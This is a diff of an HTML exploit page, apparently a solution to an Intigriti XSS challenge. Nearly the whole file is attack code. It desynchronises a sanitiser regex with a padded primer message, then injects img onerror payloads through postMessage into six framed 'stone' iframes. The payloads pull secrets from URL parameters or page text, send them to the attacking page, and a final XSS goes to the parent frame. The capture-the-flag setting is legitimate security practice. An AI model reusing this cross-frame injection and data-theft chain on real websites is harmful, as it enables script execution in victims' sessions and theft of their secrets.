@@ -1,36 +1,116 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti Exploit</title>
+    <title>Infinity Gauntlet Exploit</title>
 </head>
 <body>
-    <h1>Challenge Solved</h1>
-    <p>Click the button below to claim the bounty.</p>
-    
-    <button id="exploitBtn" style="font-size:20px; padding:20px;">Click to Solve</button>
+    <h1>Collecting Stones...</h1>
+    <iframe id="gauntlet" src="https://challenge-1225.intigriti.io/#PerfectlyBalanced" style="width:100%; height:500px;"></iframe>
 
     <script>
-        document.getElementById('exploitBtn').addEventListener('click', () => {
-            // Open the target in a new window (Allowed because of the click)
-            const win = window.open("https://challenge-1225.intigriti.io", "targetWindow");
+        const stones = {}; // We will store the stolen pieces here
+        const targetOrigin = "https://challenge-1225.intigriti.io";
 
-            // Wait for it to load, then fire the exploit
-            setTimeout(() => {
-                const targetOrigin = "https://challenge-1225.intigriti.io";
-
-                // Step 1: Primer (Advance the regex)
-                // Use the exact logic you found: 100 chars + bad char
-                const padding = "A".repeat(100); 
-                const badChar = "<"; 
-                win.postMessage(padding + badChar, targetOrigin);
-
-                // Step 2: Payload (XSS)
-                // The regex is now desynchronized and will miss this payload
-                const payload = "<img src=x onerror=alert(document.domain)>";
-                win.postMessage(payload, targetOrigin);
-                
-            }, 2000); // 2-3 seconds wait to ensure page load
+        // Listen for the stolen pieces coming back from the iframes
+        window.addEventListener('message', (event) => {
+            if (event.data.type === 'stone_collected') {
+                stones[event.data.stone] = event.data.secret;
+                checkAndSnap();
+            }
         });
+
+        const gauntlet = document.getElementById('gauntlet');
+        
+        // Wait for the main page (and its sub-iframes) to load
+        gauntlet.onload = () => {
+            setTimeout(attackStones, 2000);
+        };
+
+        function attackStones() {
+            // We attack all 6 iframes (Stone 0 to Stone 5)
+            // Note: The order in the DOM is Power, Reality, Soul, Space, Time, Mind
+            const frames = gauntlet.contentWindow.frames;
+            
+            for (let i = 0; i < frames.length; i++) {
+                sendExploit(frames[i], i);
+            }
+        }
+
+        function sendExploit(frameWindow, index) {
+            // STEP 1: The Primer (Advance regex lastIndex)
+            // Sends 100 safe chars + 1 bad char (<)
+            const padding = "A".repeat(100);
+            frameWindow.postMessage(padding + "<", '*');
+
+            // STEP 2: The Payload (XSS)
+            // This payload executes INSIDE the stone iframe.
+            // It grabs the secret (from URL or variable) and sends it back to us (top).
+            
+            // Different logic for Space Stone (Index 3) which gets data via postMessage
+            // vs others which have it in location.search
+            let extractor = "";
+            
+            if (index === 3) {
+                // Space Stone (Index 3) - Secret is likely in a variable or DOM since it came via postMessage.
+                // We'll try to grab it from the DOM or global scope. 
+                // Assumption: The challenge likely stores it in a variable 'secret' or 'key' or just in the body.
+                // Let's try dumping the document.body.innerText as a fallback if specific var is unknown
+                extractor = `
+                    var secret = document.body.innerText; // Simplest guess
+                    // Or hook the listener if we were fast enough, but we are late.
+                    // Usually in these CTFs, the flag is rendered on screen.
+                `;
+            } else {
+                // All other stones: Secret is in the URL (location.search)
+                // Format: ?stone=SECRET... we just grab the param value.
+                extractor = `
+                    var url = new URL(location.href);
+                    // The param name changes (power_stone, reality_stone...), but it's always the first param value
+                    var secret = url.searchParams.values().next().value; 
+                `;
+            }
+
+            // The final payload to inject:
+            const payload = `<img src=x onerror="
+                ${extractor}
+                top.postMessage({type: 'stone_collected', stone: ${index}, secret: secret}, '*');
+            ">`;
+
+            frameWindow.postMessage(payload, '*');
+        }
+
+        function checkAndSnap() {
+            // Do we have all 6 stones? (Indices 0 to 5)
+            if (Object.keys(stones).length >= 6) { 
+                // Reassemble the Code
+                // DOM Order: 0:Power, 1:Reality, 2:Soul, 3:Space, 4:Time, 5:Mind
+                // Code Order: Power(0-8) + Mind(8-16) + Reality(16-24) + Space(24-32) + Soul(32-40) + Time(40-48)
+                
+                // Map DOM index to Code Position
+                const p1 = stones[0]; // Power
+                const p2 = stones[5]; // Mind
+                const p3 = stones[1]; // Reality
+                const p4 = stones[3]; // Space
+                const p5 = stones[2]; // Soul
+                const p6 = stones[4]; // Time
+
+                const fullCode = p1 + p2 + p3 + p4 + p5 + p6;
+                
+                console.log("Full Code Reassembled:", fullCode);
+                
+                // EXECUTE THE FINAL ATTACK
+                // We use one of the frames (e.g., Soul/Index 2) to send the kill command to the parent
+                const killPayload = `<img src=x onerror="
+                    parent.postMessage('${fullCode}' + 'alert(document.domain)', '*');
+                ">`;
+                
+                // Re-exploit the Soul Stone to deliver the final blow
+                // Primer
+                gauntlet.contentWindow.frames[2].postMessage("A".repeat(100) + "<", '*');
+                // Attack
+                gauntlet.contentWindow.frames[2].postMessage(killPayload, '*');
+            }
+        }
     </script>
 </body>
 </html>
